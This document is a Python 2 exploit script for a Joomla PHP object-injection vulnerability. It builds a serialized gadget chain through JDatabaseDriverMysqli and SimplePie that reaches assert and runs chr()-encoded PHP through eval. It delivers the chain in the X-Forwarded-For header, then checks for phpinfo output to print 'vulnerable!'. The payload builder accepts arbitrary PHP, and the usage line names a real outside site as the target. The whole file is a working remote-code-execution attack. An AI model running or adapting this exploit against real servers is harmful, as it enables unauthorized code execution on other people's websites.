#!/usr/bin/python
# coding=utf-8
# author:KuuKi
# changed: 一手葱花味

import urllib2
import cookielib
import sys


def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
    return encoded[:-1]


def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_str_noquotes(php_payload))

    terminate = '\xf0\xfd\xfd\xfd'
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(
        str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + \
        terminate

    return exploit_template


def exp(host):
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    urllib2.socket.setdefaulttimeout(10)

    payload = generate_payload("phpinfo();")
    req = urllib2.Request(url=host, headers={
                          'User-Agent': 'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14', 'X-Forwarded-For': payload})
    # print req.headers.items()
    opener.open(req)
    req = urllib2.Request(url=host)
    # print opener.open(req).read()
    if 'SERVER["REMOTE_ADDR"]' in opener.open(req).read():
        print "vulnerable!"


def main():
    if(len(sys.argv) < 2):
        print "exp.py http://baidu.com"
    else:
        exp(sys.argv[1])

if __name__ == '__main__':
    main()
    # exp("http://127.0.0.1")